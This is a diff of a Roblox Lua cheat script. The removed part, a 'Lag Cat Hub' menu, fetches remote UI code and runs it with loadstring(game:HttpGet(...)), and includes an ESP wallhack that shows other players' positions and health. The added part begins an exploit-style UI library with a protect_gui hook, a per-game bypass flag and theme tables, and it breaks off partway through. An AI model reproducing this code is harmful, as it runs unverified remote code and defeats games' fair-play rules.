@@ -1,8705 +1,7692 @@
-
-local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/npmc_/refs/heads/main/FluentEdited.lua"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
-
--- Tạo cửa sổ Fluent chính
-local Window = Fluent:CreateWindow({
-    Title = "Lag Cat Hub",
-    SubTitle = "by yeugaivotu",
-    Search = true,
-    Icon = "rbxassetid://100794969021111",
-    TabWidth = 160,
-    Size = UDim2.fromOffset(480, 360),
-    Acrylic = true,
-    Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.RightAlt,
-
-    UserInfo = false,
-    UserInfoTop = false,
-    UserInfoTitle = game:GetService("Players").LocalPlayer.DisplayName,
-    UserInfoSubtitle = "Memaymup",
-    UserInfoSubtitleColor = Color3.fromRGB(71, 123, 255)
-})
-
--- Tabs
-local Tabs = {
-    Dev = Window:AddTab({ Title = "About", Icon = "info" }),
-    Farm = Window:AddTab({ Title = "Farm", Icon = "box" }),
-    Main = Window:AddTab({ Title = "Main", Icon = "home" }),
-    Event = Window:AddTab({ Title = "Event", Icon = "bell" }),
-    Custom = Window:AddTab({ Title = "Custom", Icon = "brush" }),
-    Player = Window:AddTab({ Title = "Player", Icon = "user" }),
-    Visual = Window:AddTab({ Title = "Visual", Icon = "eye" }),
-    Misc = Window:AddTab({ Title = "Misc", Icon = "menu" }),
-    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
-}
-
--- Phần Logic Chính
-
---// ⚙️ ESPManager v2.7 (Auto-Restore + Debounce 0.5s)
---// Tự thêm lại khi model biến mất/hiện, chết/hồi sinh, GUI/HL mất, với debounce 0.5s để tránh lag
-
+local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
-
-local ESPManager = {
-    ActiveTypes = {},    -- ["Player"] = true
-    Objects = {},        -- [model] = { type, gui, hl, label, conns = {} }
-    Filters = {},        -- filterFn
-    Colors = {},         -- typeColor
-    Watchers = {},       -- connection table
-    ShowHP = {},         -- typeName -> boolean
-    _pendingCreate = {}, -- [model] = true (debounce)
-}
-
--- Helper: safe find primary part
-local function getPrimaryPart(model)
-    if not model then return nil end
-    local p = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
-    return p
-end
-
--- 🧩 Đăng ký loại ESP
-function ESPManager:RegisterType(name, color, filterFn, showHP)
-    self.Filters[name] = filterFn
-    self.Colors[name] = color
-    self.ShowHP[name] = showHP or false
-    self.ActiveTypes[name] = false
-end
-
--- internal: disconnect connections table
-local function disconnectConns(tbl)
-    if not tbl then return end
-    for _, c in pairs(tbl) do
-        if c and typeof(c.Disconnect) == "function" then
-            pcall(function() c:Disconnect() end)
-        end
-    end
-end
-
--- 🧱 Tạo ESP (không debounce) - gọi an toàn bên trong task.delay khi cần
-function ESPManager:_CreateImmediate(model, typeName)
-    if not model or not model.Parent then return end
-    if ESPManager.Objects[model] then
-        -- nếu tồn tại nhưng bị hỏng phần gui/hl thì dọn trước
-        local existing = ESPManager.Objects[model]
-        if existing.gui and existing.gui.Parent and existing.hl and existing.hl.Parent then
-            return -- đã ok rồi
-        else
-            ESPManager:Remove(model)
-        end
-    end
-
-    local color = ESPManager.Colors[typeName]
-    local part = getPrimaryPart(model)
-    if not part then return end
-
-    -- Billboard
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "ESP_" .. typeName
-    billboard.Size = UDim2.new(0, 180, 0, 35)
-    billboard.AlwaysOnTop = true
-    billboard.StudsOffset = Vector3.new(0, 3, 0)
-    billboard.MaxDistance = 600
-    billboard.Parent = part
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.TextColor3 = color
-    label.TextStrokeTransparency = 0.3
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 16
-    label.Text = model.Name
-    label.Parent = billboard
-
-    -- Highlight
-    local hl = Instance.new("Highlight")
-    hl.Adornee = model
-    hl.FillColor = color
-    hl.OutlineColor = color
-    hl.FillTransparency = 0.7
-    hl.OutlineTransparency = 0
-    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    hl.Enabled = true
-    hl.Parent = model
-
-    -- Kết nối model-level watchers (để tự phục hồi khi parent thay đổi / respawn / humanoid died)
-    local conns = {}
-
-    -- nếu model bị reparent / removed -> schedule recreate (debounced)
-    table.insert(conns, model.AncestryChanged:Connect(function(_, parent)
-        -- nếu model không còn trong workspace, xóa ESP
-        if not model:IsDescendantOf(workspace) then
-            -- xóa ngay (không recreate khi user tắt loại)
-            if ESPManager.Objects[model] and ESPManager.Objects[model].type == typeName then
-                ESPManager:Remove(model)
-            end
-            return
-        end
-        -- nếu trở lại workspace -> debounce tạo lại
-        if ESPManager.ActiveTypes[typeName] and ESPManager.Filters[typeName](model) then
-            ESPManager:_ScheduleCreate(model, typeName)
-        end
-    end))
-
-    -- watch humanoid death & respawn
-    local function watchHumanoid(hum)
-        if not hum then return end
-        -- Died -> remove, rồi chờ humanoid mới
-        table.insert(conns, hum.Died:Connect(function()
-            if ESPManager.Objects[model] and ESPManager.Objects[model].type == typeName then
-                ESPManager:Remove(model)
-            end
-            -- chờ humanoid mới xuất hiện (ChildAdded)
-            -- scheduled create sẽ handle khi Humanoid xuất hiện
-        end))
-    end
-
-    -- nếu đã có humanoid, watch nó
-    watchHumanoid(model:FindFirstChildOfClass("Humanoid"))
-
-    -- listen ChildAdded để detect humanoid respawn
-    table.insert(conns, model.ChildAdded:Connect(function(child)
-        if child and child:IsA("Humanoid") then
-            -- humanoid mới -> schedule create
-            watchHumanoid(child)
-            if ESPManager.ActiveTypes[typeName] and ESPManager.Filters[typeName](model) then
-                ESPManager:_ScheduleCreate(model, typeName)
-            end
-        end
-        -- nếu PrimaryPart xuất hiện muộn cũng schedule create
-        if (child:IsA("BasePart") or child:IsA("Model")) and ESPManager.ActiveTypes[typeName] and ESPManager.Filters[typeName](model) then
-            -- primary part may appear later
-            ESPManager:_ScheduleCreate(model, typeName)
-        end
-    end))
-
-    ESPManager.Objects[model] = {
-        type = typeName,
-        gui = billboard,
-        label = label,
-        hl = hl,
-        conns = conns,
-    }
-end
-
--- 🧱 Public Create (debounced wrapper)
-function ESPManager:_ScheduleCreate(model, typeName)
-    if not model or not typeName then return end
-    -- nếu loại đang tắt thì không schedule
-    if not ESPManager.ActiveTypes[typeName] then return end
-    -- tránh schedule nhiều lần
-    if ESPManager._pendingCreate[model] then return end
-    ESPManager._pendingCreate[model] = true
-
-    -- dùng task.delay 0.5 để debounce, tránh spam tạo khi model đang mid-update
-    task.delay(0.5, function()
-        pcall(function()
-            ESPManager._pendingCreate[model] = nil
-            -- double-check điều kiện
-            if not model or not model.Parent then return end
-            local filterFn = ESPManager.Filters[typeName]
-            if not filterFn or not filterFn(model) then return end
-            -- call immediate create (safe)
-            ESPManager:_CreateImmediate(model, typeName)
-        end)
-    end)
-end
-
--- 🧹 Xoá ESP
-function ESPManager:Remove(model)
-    local data = self.Objects[model]
-    if not data then return end
-
-    -- disconnect model connections
-    if data.conns then
-        disconnectConns(data.conns)
-    end
-
-    pcall(function() if data.gui then data.gui:Destroy() end end)
-    pcall(function() if data.hl then data.hl:Destroy() end end)
-    self.Objects[model] = nil
-    -- clear pending if any
-    self._pendingCreate[model] = nil
-end
-
--- ⚙️ Tạo watcher (tự động thêm/xóa ESP khi model thay đổi)
-function ESPManager:StartWatcher(typeName)
-    local filterFn = self.Filters[typeName]
-    if not filterFn then return end
-    if self.Watchers[typeName] then return end
-
-    -- tạo ESP cho model sẵn có (debounced per model)
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if filterFn(obj) then
-            -- schedule create with debounce
-            self:_ScheduleCreate(obj, typeName)
-        end
-    end
-
-    -- theo dõi model mới (DescendantAdded) nhưng schedule create chỉ khi hợp lệ
-    local addConn = workspace.DescendantAdded:Connect(function(obj)
-        if self.ActiveTypes[typeName] and filterFn(obj) then
-            self:_ScheduleCreate(obj, typeName)
-        end
-    end)
-
-    -- khi model bị remove -> Remove ESP nếu có
-    local removeConn = workspace.DescendantRemoving:Connect(function(obj)
-        if self.Objects[obj] and self.Objects[obj].type == typeName then
-            self:Remove(obj)
-        end
-        -- clear any pending create when descendant removing
-        self._pendingCreate[obj] = nil
-    end)
-
-    self.Watchers[typeName] = {add = addConn, rem = removeConn}
-end
-
-function ESPManager:StopWatcher(typeName)
-    local w = self.Watchers[typeName]
-    if w then
-        if w.add then w.add:Disconnect() end
-        if w.rem then w.rem:Disconnect() end
-    end
-    self.Watchers[typeName] = nil
-end
-
--- ♻️ Cập nhật (1 vòng duy nhất, cực nhẹ) - CHỈ cập nhật text / kiểm tra nhanh
-RunService.Heartbeat:Connect(function()
-    -- Sử dụng pairs(Objects) nhỏ (chỉ những model có ESP hiện tại)
-    for model, data in pairs(ESPManager.Objects) do
-        -- nếu model hỏng -> dọn
-        if not model or not model.Parent then
-            ESPManager:Remove(model)
-        else
-            local part = getPrimaryPart(model)
-            if not part then
-                ESPManager:Remove(model)
-            else
-                -- nếu gui/hl bị xóa bất ngờ -> schedule recreate (debounced)
-                local needRecreate = false
-                if (not data.gui) or (not data.hl) or (not data.label) then
-                    needRecreate = true
-                else
-                    -- kiểm tra parent tình trạng (nếu parent nil)
-                    if not data.gui.Parent then
-                        needRecreate = true
-                    end
-                end
-                if needRecreate then
-                    -- remove entry ngay (dọn) và schedule tạo lại an toàn
-                    local typeName = data.type
-                    ESPManager:Remove(model)
-                    ESPManager:_ScheduleCreate(model, typeName)
-                    -- next model
-                else
-                    -- cập nhật text (nhẹ)
-                    local dist = (Camera.CFrame.Position - part.Position).Magnitude
-                    local txt = model.Name
-                    local showHP = ESPManager.ShowHP[data.type]
-                    if showHP then
-                        local hum = model:FindFirstChildOfClass("Humanoid")
-                        if hum then
-                            txt = string.format("%s | HP:%d | [%.0fm]", txt, math.floor(hum.Health), dist)
-                        else
-                            txt = string.format("%s [%.0fm]", txt, dist)
-                        end
-                    else
-                        txt = string.format("%s [%.0fm]", txt, dist)
-                    end
-                    if data.label then
-                        -- label update is cheap
-                        pcall(function() data.label.Text = txt end)
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- ⚡ Bật/Tắt từng loại ESP
-function ESPManager:SetEnabled(typeName, state)
-    self.ActiveTypes[typeName] = state
-
-    if state then
-        self:StartWatcher(typeName)
-        -- khi bật lại, quét nhanh toàn bộ workspace và schedule create (debounced)
-        local filterFn = self.Filters[typeName]
-        if filterFn then
-            for _, obj in ipairs(workspace:GetDescendants()) do
-                if filterFn(obj) then
-                    self:_ScheduleCreate(obj, typeName)
-                end
-            end
-        end
-    else
-        self:StopWatcher(typeName)
-        -- xóa toàn bộ ESP loại đó
-        for model, data in pairs(self.Objects) do
-            if data.type == typeName then
-                self:Remove(model)
-            end
-        end
-    end
-end
-
-_G.ESPManager = ESPManager
-
-
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
+local TextService = game:GetService("TextService")
+local Camera = game:GetService("Workspace").CurrentCamera
+local Mouse = LocalPlayer:GetMouse()
+local httpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
 
-local HideGui = Instance.new("ScreenGui")
-HideGui.Name = "Crystal Hub Btn"
-HideGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-HideGui.ResetOnSpawn = false
-HideGui.Parent = game.CoreGui
+local Mobile = not RunService:IsStudio() and table.find({Enum.Platform.IOS, Enum.Platform.Android}, UserInputService:GetPlatform()) ~= nil
 
-local Zoomed = false
+local fischbypass
 
-local SmallSize = 30
-local BigSize = 40
-
-local btnHide = Instance.new("TextButton", HideGui)
-btnHide.BackgroundTransparency = 1
-btnHide.Text = ""
-btnHide.AnchorPoint = Vector2.new(0, 1)
-btnHide.Size = UDim2.new(0, 50, 0, 50)
-btnHide.Position = UDim2.new(0, 15, 1, -15)
-
-local btnHideFrame = Instance.new("Frame", btnHide)
-btnHideFrame.AnchorPoint = Vector2.new(0, 1)
-btnHideFrame.Size = UDim2.new(0, 50, 0, 50)
-btnHideFrame.Position = UDim2.new(0, 0, 1, 0)
-btnHideFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-btnHideFrame.BackgroundTransparency = .25
-
-local imgHide = Instance.new("ImageLabel", btnHide)
-imgHide.BackgroundTransparency = 1
-imgHide.Image = "rbxassetid://100794969021111"
-imgHide.AnchorPoint = Vector2.new(.5, .5)
-imgHide.Position = UDim2.new(.5, 0, .5, 0)
-imgHide.Size = UDim2.new(0, SmallSize, 0, SmallSize)
-
-Instance.new("UICorner", btnHideFrame).CornerRadius = UDim.new(1, 0)
-
-local function ToggleZoomState()
-    Zoomed = not Zoomed
-    local targetSize = Zoomed and BigSize or SmallSize
-
-    TweenService:Create(imgHide, TweenInfo.new(.2, Enum.EasingStyle.Quad), {
-        Size = UDim2.new(0, targetSize, 0, targetSize)
-    }):Play()
+if game.GameId == 5750914919 then
+	fischbypass = true
 end
 
-btnHide.MouseButton1Click:Connect(function()
-    ToggleZoomState()
+local RenderStepped = RunService.RenderStepped
 
-    if Window and Window.Minimize then
-        Window:Minimize(not Window.Minimized)
-    end
+local ProtectGui = protectgui or (syn and syn.protect_gui) or function() end
 
-    if Library and Library.ToggleUI then
-        Library.ToggleUI()
-    end
-end)
+local Themes = {
+	Names = {
+		"Dark",
+		"Darker", 
+		"AMOLED",
+		"Light",
+		"Balloon",
+		"SoftCream",
+		"Aqua", 
+		"Amethyst",
+		"Rose",
+		"Midnight",
+		"Forest",
+		"Sunset", 
+		"Ocean",
+		"Emerald",
+		"Sapphire",
+		"Cloud",
+		"Grape",
+		"Bloody",
+		"Arctic"
+	},
+	Dark = {
+		Name = "Dark",
+		Accent = Color3.fromRGB(96, 205, 255),
+		AcrylicMain = Color3.fromRGB(60, 60, 60),
+		AcrylicBorder = Color3.fromRGB(90, 90, 90),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(40, 40, 40), Color3.fromRGB(40, 40, 40)),
+		AcrylicNoise = 0.9,
+		TitleBarLine = Color3.fromRGB(75, 75, 75),
+		Tab = Color3.fromRGB(120, 120, 120),
+		Element = Color3.fromRGB(120, 120, 120),
+		ElementBorder = Color3.fromRGB(35, 35, 35),
+		InElementBorder = Color3.fromRGB(90, 90, 90),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(120, 120, 120),
+		ToggleToggled = Color3.fromRGB(42, 42, 42),
+		SliderRail = Color3.fromRGB(120, 120, 120),
+		DropdownFrame = Color3.fromRGB(160, 160, 160),
+		DropdownHolder = Color3.fromRGB(45, 45, 45),
+		DropdownBorder = Color3.fromRGB(35, 35, 35),
+		DropdownOption = Color3.fromRGB(120, 120, 120),
+		Keybind = Color3.fromRGB(120, 120, 120),
+		Input = Color3.fromRGB(160, 160, 160),
+		InputFocused = Color3.fromRGB(10, 10, 10),
+		InputIndicator = Color3.fromRGB(150, 150, 150),
+		Dialog = Color3.fromRGB(45, 45, 45),
+		DialogHolder = Color3.fromRGB(35, 35, 35),
+		DialogHolderLine = Color3.fromRGB(30, 30, 30),
+		DialogButton = Color3.fromRGB(45, 45, 45),
+		DialogButtonBorder = Color3.fromRGB(80, 80, 80),
+		DialogBorder = Color3.fromRGB(70, 70, 70),
+		DialogInput = Color3.fromRGB(55, 55, 55),
+		DialogInputLine = Color3.fromRGB(160, 160, 160),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(120, 120, 120),
+		HoverChange = 0.07,
+	},
+	Darker = {
+		Name = "Darker",
+		Accent = Color3.fromRGB(56, 109, 223),
+		AcrylicMain = Color3.fromRGB(30, 30, 30),
+		AcrylicBorder = Color3.fromRGB(60, 60, 60),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(17, 17, 17), Color3.fromRGB(18, 18, 18)),
+		AcrylicNoise = 0.94,
+		TitleBarLine = Color3.fromRGB(65, 65, 65),
+		Tab = Color3.fromRGB(100, 100, 100),
+		Element = Color3.fromRGB(70, 70, 70),
+		ElementBorder = Color3.fromRGB(25, 25, 25),
+		InElementBorder = Color3.fromRGB(55, 55, 55),
+		ElementTransparency = 0.82,
+		DropdownFrame = Color3.fromRGB(120, 120, 120),
+		DropdownHolder = Color3.fromRGB(35, 35, 35),
+		DropdownBorder = Color3.fromRGB(25, 25, 25),
+		Dialog = Color3.fromRGB(35, 35, 35),
+		DialogHolder = Color3.fromRGB(25, 25, 25),
+		DialogHolderLine = Color3.fromRGB(20, 20, 20),
+		DialogButton = Color3.fromRGB(35, 35, 35),
+		DialogButtonBorder = Color3.fromRGB(55, 55, 55),
+		DialogBorder = Color3.fromRGB(50, 50, 50),
+		DialogInput = Color3.fromRGB(45, 45, 45),
+		DialogInputLine = Color3.fromRGB(120, 120, 120),
+	},
+	AMOLED = {
+		Name = "AMOLED",
+		Accent = Color3.fromRGB(255, 255, 255),
+		AcrylicMain = Color3.fromRGB(0, 0, 0),
+		AcrylicBorder = Color3.fromRGB(20, 20, 20),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(0, 0, 0), Color3.fromRGB(0, 0, 0)),
+		AcrylicNoise = 1,
+		TitleBarLine = Color3.fromRGB(25, 25, 25),
+		Tab = Color3.fromRGB(40, 40, 40),
+		Element = Color3.fromRGB(15, 15, 15),
+		ElementBorder = Color3.fromRGB(0, 0, 0),
+		InElementBorder = Color3.fromRGB(40, 40, 40),
+		ElementTransparency = 0.95,
+		ToggleSlider = Color3.fromRGB(40, 40, 40),
+		ToggleToggled = Color3.fromRGB(255, 255, 255),
+		SliderRail = Color3.fromRGB(40, 40, 40),
+		DropdownFrame = Color3.fromRGB(20, 20, 20),
+		DropdownHolder = Color3.fromRGB(0, 0, 0),
+		DropdownBorder = Color3.fromRGB(0, 0, 0),
+		DropdownOption = Color3.fromRGB(40, 40, 40),
+		Keybind = Color3.fromRGB(40, 40, 40),
+		Input = Color3.fromRGB(40, 40, 40),
+		InputFocused = Color3.fromRGB(0, 0, 0),
+		InputIndicator = Color3.fromRGB(60, 60, 60),
+		InputIndicatorFocus = Color3.fromRGB(255, 255, 255),
+		Dialog = Color3.fromRGB(0, 0, 0),
+		DialogHolder = Color3.fromRGB(0, 0, 0),
+		DialogHolderLine = Color3.fromRGB(20, 20, 20),
+		DialogButton = Color3.fromRGB(15, 15, 15),
+		DialogButtonBorder = Color3.fromRGB(30, 30, 30),
+		DialogBorder = Color3.fromRGB(27, 27, 27),
+		DialogInput = Color3.fromRGB(15, 15, 15),
+		DialogInputLine = Color3.fromRGB(60, 60, 60),
+		Text = Color3.fromRGB(255, 255, 255),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(40, 40, 40),
+		HoverChange = 0.04
+	},
+	Light = {
+		Name = "Light",
+		Accent = Color3.fromRGB(0, 103, 192),
+		AcrylicMain = Color3.fromRGB(200, 200, 200),
+		AcrylicBorder = Color3.fromRGB(120, 120, 120),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(255, 255, 255)),
+		AcrylicNoise = 0.96,
+		TitleBarLine = Color3.fromRGB(160, 160, 160),
+		Tab = Color3.fromRGB(90, 90, 90),
+		Element = Color3.fromRGB(255, 255, 255),
+		ElementBorder = Color3.fromRGB(180, 180, 180),
+		InElementBorder = Color3.fromRGB(150, 150, 150),
+		ElementTransparency = 0.65,
+		ToggleSlider = Color3.fromRGB(40, 40, 40),
+		ToggleToggled = Color3.fromRGB(255, 255, 255),
+		SliderRail = Color3.fromRGB(40, 40, 40),
+		DropdownFrame = Color3.fromRGB(200, 200, 200),
+		DropdownHolder = Color3.fromRGB(240, 240, 240),
+		DropdownBorder = Color3.fromRGB(200, 200, 200),
+		DropdownOption = Color3.fromRGB(150, 150, 150),
+		Keybind = Color3.fromRGB(120, 120, 120),
+		Input = Color3.fromRGB(200, 200, 200),
+		InputFocused = Color3.fromRGB(100, 100, 100),
+		InputIndicator = Color3.fromRGB(80, 80, 80),
+		InputIndicatorFocus = Color3.fromRGB(0, 103, 192),
+		Dialog = Color3.fromRGB(255, 255, 255),
+		DialogHolder = Color3.fromRGB(240, 240, 240),
+		DialogHolderLine = Color3.fromRGB(228, 228, 228),
+		DialogButton = Color3.fromRGB(255, 255, 255),
+		DialogButtonBorder = Color3.fromRGB(190, 190, 190),
+		DialogBorder = Color3.fromRGB(140, 140, 140),
+		DialogInput = Color3.fromRGB(250, 250, 250),
+		DialogInputLine = Color3.fromRGB(160, 160, 160),
+		Text = Color3.fromRGB(0, 0, 0),
+		SubText = Color3.fromRGB(40, 40, 40),
+		Hover = Color3.fromRGB(50, 50, 50),
+		HoverChange = 0.16,
+	},
+	Balloon = {
+		Name = "Balloon",
+		Accent = Color3.fromRGB(100, 170, 255),
+		AcrylicMain = Color3.fromRGB(189, 224, 255),
+		AcrylicBorder = Color3.fromRGB(160, 227, 255),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(240, 250, 255), Color3.fromRGB(210, 235, 250)),
+		AcrylicNoise = 1,
+		TitleBarLine = Color3.fromRGB(150, 200, 255),
+		Tab = Color3.fromRGB(153, 185, 255),
+		Element = Color3.fromRGB(160, 200, 255),
+		ElementBorder = Color3.fromRGB(130, 170, 230),
+		InElementBorder = Color3.fromRGB(120, 174, 240),
+		ElementTransparency = 0.80,
+		ToggleSlider = Color3.fromRGB(93, 163, 255),
+		ToggleToggled = Color3.fromRGB(60, 112, 180),
+		SliderRail = Color3.fromRGB(170, 220, 255),
+		DropdownFrame = Color3.fromRGB(175, 235, 255),
+		DropdownHolder = Color3.fromRGB(200, 220, 240),
+		DropdownBorder = Color3.fromRGB(130, 170, 230),
+		DropdownOption = Color3.fromRGB(146, 202, 255),
+		Keybind = Color3.fromRGB(170, 220, 255),
+		Input = Color3.fromRGB(170, 220, 255),
+		InputFocused = Color3.fromRGB(75, 95, 140),
+		InputIndicator = Color3.fromRGB(190, 250, 255),
+		InputIndicatorFocus = Color3.fromRGB(100, 170, 255),
+		Dialog = Color3.fromRGB(189, 230, 255),
+		DialogHolder = Color3.fromRGB(201, 239, 255),
+		DialogHolderLine = Color3.fromRGB(197, 236, 250),
+		DialogButton = Color3.fromRGB(219, 252, 255),
+		DialogButtonBorder = Color3.fromRGB(160, 200, 255),
+		DialogBorder = Color3.fromRGB(175, 220, 255),
+		DialogInput = Color3.fromRGB(160, 200, 255),
+		DialogInputLine = Color3.fromRGB(185, 230, 255),
+		Text = Color3.fromRGB(30, 30, 30),
+		SubText = Color3.fromRGB(90, 90, 90),
+		Hover = Color3.fromRGB(170, 220, 255),
+		HoverChange = 0.03
+	},
+	SoftCream = {
+		Name = "SoftCream",
+		Accent = Color3.fromRGB(206, 163, 90),
+		AcrylicMain = Color3.fromRGB(255, 245, 220),
+		AcrylicBorder = Color3.fromRGB(255, 230, 200),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(255, 245, 220), Color3.fromRGB(255, 235, 210)),
+		AcrylicNoise = 0.93,
+		TitleBarLine = Color3.fromRGB(255, 220, 190),
+		Tab = Color3.fromRGB(199, 165, 112),
+		Element = Color3.fromRGB(255, 216, 161),
+		ElementBorder = Color3.fromRGB(234, 193, 111),
+		InElementBorder = Color3.fromRGB(255, 212, 143),
+		ElementTransparency = 0.80,
+		ToggleSlider = Color3.fromRGB(214, 175, 97),
+		ToggleToggled = Color3.fromRGB(200, 160, 100),
+		SliderRail = Color3.fromRGB(255, 220, 190),
+		DropdownFrame = Color3.fromRGB(255, 228, 164),
+		DropdownHolder = Color3.fromRGB(250, 240, 225),
+		DropdownBorder = Color3.fromRGB(255, 210, 180),
+		DropdownOption = Color3.fromRGB(255, 190, 115),
+		Keybind = Color3.fromRGB(255, 220, 190),
+		Input = Color3.fromRGB(255, 220, 190),
+		InputFocused = Color3.fromRGB(180, 140, 80),
+		InputIndicator = Color3.fromRGB(255, 250, 205),
+		InputIndicatorFocus = Color3.fromRGB(255, 236, 158),
+		Dialog = Color3.fromRGB(255, 255, 240),
+		DialogHolder = Color3.fromRGB(255, 245, 220),
+		DialogHolderLine = Color3.fromRGB(255, 240, 210),
+		DialogButton = Color3.fromRGB(255, 255, 240),
+		DialogButtonBorder = Color3.fromRGB(255, 210, 180),
+		DialogBorder = Color3.fromRGB(255, 220, 190),
+		DialogInput = Color3.fromRGB(255, 210, 180),
+		DialogInputLine = Color3.fromRGB(255, 225, 205),
+		Text = Color3.fromRGB(30, 30, 30),
+		SubText = Color3.fromRGB(90, 90, 90),
+		Hover = Color3.fromRGB(255, 220, 190),
+		HoverChange = 0.03
+	},
+	Aqua = {
+		Name = "Aqua",
+		Accent = Color3.fromRGB(38, 166, 178),
+		AcrylicMain = Color3.fromRGB(18, 54, 61),
+		AcrylicBorder = Color3.fromRGB(80, 118, 130),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(41, 101, 139), Color3.fromRGB(11, 132, 128)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(68, 135, 136),
+		Tab = Color3.fromRGB(126, 175, 180),
+		Element = Color3.fromRGB(66, 130, 160),
+		ElementBorder = Color3.fromRGB(40, 100, 122),
+		InElementBorder = Color3.fromRGB(75, 109, 110),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(100, 152, 160),
+		ToggleToggled = Color3.fromRGB(25, 70, 95),
+		SliderRail = Color3.fromRGB(115, 150, 160),
+		DropdownFrame = Color3.fromRGB(158, 194, 200),
+		DropdownHolder = Color3.fromRGB(39, 99, 116),
+		DropdownBorder = Color3.fromRGB(33, 119, 120),
+		DropdownOption = Color3.fromRGB(121, 152, 160),
+		Keybind = Color3.fromRGB(108, 153, 160),
+		Input = Color3.fromRGB(112, 156, 160),
+		InputFocused = Color3.fromRGB(14, 35, 40),
+		InputIndicator = Color3.fromRGB(137, 181, 190),
+		Dialog = Color3.fromRGB(27, 113, 130),
+		DialogHolder = Color3.fromRGB(33, 99, 109),
+		DialogHolderLine = Color3.fromRGB(34, 81, 86),
+		DialogButton = Color3.fromRGB(27, 128, 130),
+		DialogButtonBorder = Color3.fromRGB(62, 100, 110),
+		DialogBorder = Color3.fromRGB(26, 86, 100),
+		DialogInput = Color3.fromRGB(36, 107, 105),
+		DialogInputLine = Color3.fromRGB(70, 120, 130),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(112, 155, 160),
+		HoverChange = 0.04,
+	},
+	Amethyst = {
+		Name = "Amethyst",
+		Accent = Color3.fromRGB(126, 44, 182),
+		AcrylicMain = Color3.fromRGB(40, 12, 71),
+		AcrylicBorder = Color3.fromRGB(85, 45, 120),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(34, 19, 49), Color3.fromRGB(41, 24, 57)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(95, 55, 130),
+		Tab = Color3.fromRGB(135, 75, 170),
+		Element = Color3.fromRGB(115, 55, 150),
+		ElementBorder = Color3.fromRGB(60, 35, 85),
+		InElementBorder = Color3.fromRGB(85, 45, 110),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(135, 65, 160),
+		ToggleToggled = Color3.fromRGB(59, 30, 79),
+		SliderRail = Color3.fromRGB(135, 65, 160),
+		DropdownFrame = Color3.fromRGB(145, 85, 170),
+		DropdownHolder = Color3.fromRGB(50, 30, 70),
+		DropdownBorder = Color3.fromRGB(60, 35, 85),
+		DropdownOption = Color3.fromRGB(135, 65, 160),
+		Keybind = Color3.fromRGB(135, 65, 160),
+		Input = Color3.fromRGB(135, 65, 160),
+		InputFocused = Color3.fromRGB(25, 15, 35),
+		InputIndicator = Color3.fromRGB(155, 85, 180),
+		InputIndicatorFocus = Color3.fromRGB(126, 44, 182),
+		Dialog = Color3.fromRGB(50, 30, 70),
+		DialogHolder = Color3.fromRGB(40, 25, 60),
+		DialogHolderLine = Color3.fromRGB(35, 20, 55),
+		DialogButton = Color3.fromRGB(50, 30, 70),
+		DialogButtonBorder = Color3.fromRGB(90, 50, 120),
+		DialogBorder = Color3.fromRGB(80, 45, 110),
+		DialogInput = Color3.fromRGB(60, 35, 80),
+		DialogInputLine = Color3.fromRGB(145, 75, 170),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(135, 65, 160),
+		HoverChange = 0.04
+	},
+	Rose = {
+		Name = "Rose",
+		Accent = Color3.fromRGB(219, 48, 123),
+		AcrylicMain = Color3.fromRGB(35, 25, 30),
+		AcrylicBorder = Color3.fromRGB(145, 35, 75),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(65, 25, 45), Color3.fromRGB(75, 30, 50)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(150, 65, 95),
+		Tab = Color3.fromRGB(190, 85, 115),
+		Element = Color3.fromRGB(170, 60, 90),
+		ElementBorder = Color3.fromRGB(95, 35, 55),
+		InElementBorder = Color3.fromRGB(120, 50, 70),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(190, 75, 105),
+		ToggleToggled = Color3.fromRGB(45, 15, 25),
+		SliderRail = Color3.fromRGB(190, 75, 105),
